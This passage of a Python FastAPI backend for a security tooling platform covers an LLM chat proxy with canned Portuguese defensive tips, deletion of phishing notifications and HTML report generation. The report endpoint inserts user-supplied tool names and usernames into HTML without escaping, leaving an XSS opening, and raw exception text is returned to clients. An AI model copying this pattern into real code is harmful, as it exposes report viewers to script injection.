    if groq_key:
        base_url = "https://api.groq.com/openai/v1/chat/completions"
        model = os.getenv("GROQ_MODEL", "llama-3.1-8b-instant")
        headers = {
            "Authorization": f"Bearer {groq_key}",
            "Content-Type": "application/json"
        }
        body = {"model": model, "messages": messages, "temperature": 0.2}
    elif openrouter_key:
        base_url = "https://openrouter.ai/api/v1/chat/completions"
        model = os.getenv("AI_MODEL", "meta-llama/llama-3.1-8b-instruct")
        headers = {
            "Authorization": f"Bearer {openrouter_key}",
            "Content-Type": "application/json"
        }
        body = {"model": model, "messages": messages, "temperature": 0.2}
    else:
        user_msg = payload.message.strip() if isinstance(payload.message, str) else ""
        base_reply = (
            "Assistente de Segurança (modo básico)\n\n"
            "Diretrizes práticas:\n"
            "- Valide e saneie entradas (server-side).\n"
            "- Use autenticação forte e MFA.\n"
            "- Aplique princípios OWASP Top 10.\n"
            "- Habilite cabeçalhos de segurança (CSP, HSTS, X-Frame-Options).\n"
            "- Faça gestão de patches e revisão de dependências.\n\n"
            "Ferramentas úteis no painel: Scanner de Código, Port Scanner, Encoder/Decoder.\n\n"
        )
        m = user_msg.lower()
        if any(k in m for k in ["xss", "cross-site scripting"]):
            reply = (
                base_reply +
                "XSS:\n"
                "1) Escape de saída conforme o contexto (HTML/Attr/JS/URL).\n"
                "2) Sanitize e valide entradas.\n"
                "3) Ative CSP (default-src 'self'; script-src com nonce).\n"
                "4) Remova eval/innerHTML sem sanitização.\n"
                "5) Encode ao construir HTML dinamicamente."
            )
        elif any(k in m for k in ["sql", "injection", "sqli"]):
            reply = (
                base_reply +
                "SQL Injection:\n"
                "1) Use queries parametrizadas/prepared statements.\n"
                "2) Bloqueie concatenação de SQL com input.\n"
                "3) Mínimo privilégio no usuário de DB.\n"
                "4) Auditoria de consultas e WAF onde possível.\n"
                "5) Valide/normalize input por whitelist."
            )
        elif "csrf" in m:
            reply = (
                base_reply +
                "CSRF:\n"
                "1) Tokens anti-CSRF vinculados à sessão.\n"
                "2) Verifique SameSite nos cookies (Lax/Strict).\n"
                "3) Exija revalidação para ações sensíveis.\n"
                "4) Origin/Referer checking conforme aplicável."
            )
        elif any(k in m for k in ["hardening", "segurança", "endurecimento"]):
            reply = (
                base_reply +
                "Hardening:\n"
                "- Desative serviços não usados.\n"
                "- Mantenha sistema e libs atualizados.\n"
                "- Registre e monitore eventos (SIEM).\n"
                "- Segregue redes e aplique firewall.\n"
                "- Backup e testes de restauração regulares."
            )
        else:
            reply = (
                base_reply +
                ("Pergunta: " + user_msg + "\n\n" if user_msg else "") +
                "Próximos passos:\n"
                "- Detalhe o contexto (app/stack/dados).\n"
                "- Execute um scan direcionado e revise findings.\n"
                "- Aplique correções rápidas e planeje melhorias estruturais."
            )
        return {"reply": reply}

    async with httpx.AsyncClient(timeout=30) as client:
        resp = await client.post(base_url, headers=headers, json=body)
        if resp.status_code >= 300:
            try:
                err = resp.json()
                detail = err.get("error", {}).get("message") or err.get("message") or resp.text
            except Exception:
                detail = resp.text
            raise HTTPException(status_code=resp.status_code, detail=detail)
        data = resp.json()
        reply = (
            (data.get("choices") or [{}])[0].get("message", {}).get("content")
            or (data.get("choices") or [{}])[0].get("text")
            or ""
        )
        return {"reply": reply}


@router.delete("/notifications/{notification_id}", tags=["Notifications"])
async def delete_notification(
    notification_id: str,
    current_user: dict = Depends(get_current_user)
):
    """Delete a notification"""
    import json
    notification_file = "/tmp/phishing_notifications.json"
    
    if not os.path.exists(notification_file):
        raise HTTPException(status_code=404, detail="No notifications found")
    
    try:
        with open(notification_file, 'r') as f:
            notifications = json.load(f)
        
        notifications = [n for n in notifications if n['id'] != notification_id]
        
        with open(notification_file, 'w') as f:
            json.dump(notifications, f, indent=2)
        
        return {"success": True, "message": "Notification deleted"}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


# ==================== REPORT GENERATION ====================

class ReportGenerationRequest(BaseModel):
    tool_name: str
    tool_data: dict
    result_data: dict
    generated_at: str
    user: str


@router.post("/generate-report", tags=["Reports"])
async def generate_report(
    request: ReportGenerationRequest,
    current_user: dict = Depends(get_current_user)
):
    """Generate HTML report for any security tool"""
    try:
        # Gera HTML do relatório
        report_html = f"""
        <div style="font-family: Arial, sans-serif;">
            <h1 style="color: #7c3aed; border-bottom: 3px solid #7c3aed; padding-bottom: 10px;">
                Relatório - {request.tool_name}
            </h1>
            <div style="background: #f5f5f5; padding: 15px; margin: 20px 0; border-radius: 5px;">
                <p><strong>Data:</strong> {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}</p>
                <p><strong>Analista:</strong> {request.user}</p>
                <p><strong>Ferramenta:</strong> {request.tool_name}</p>
            </div>
            
            <h2 style="color: #333; margin-top: 30px;">Dados da Execução</h2>
            <div style="background: white; padding: 20px; border: 1px solid #ddd; border-radius: 5px;">
                <pre style="white-space: pre-wrap; word-wrap: break-word;">{json.dumps(request.tool_data, indent=2, ensure_ascii=False)}</pre>
            </div>
            
            <h2 style="color: #333; margin-top: 30px;">Resultados</h2>
            <div style="background: white; padding: 20px; border: 1px solid #ddd; border-radius: 5px;">
                <pre style="white-space: pre-wrap; word-wrap: break-word;">{json.dumps(request.result_data, indent=2, ensure_ascii=False)}</pre>
            </div>
            
            <div style="margin-top: 40px; padding: 20px; background: #f0f0f0; border-radius: 5px;">
                <h3>Observações</h3>
                <p>Este relatório foi gerado automaticamente pela Ades Plataform.</p>
                <p>Revise os resultados cuidadosamente e tome as ações necessárias para corrigir as vulnerabilidades encontradas.</p>
            </div>
        </div>
        """
        
        return {
            "success": True,
            "report_html": report_html,
            "generated_at": datetime.now().isoformat()
        }
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))
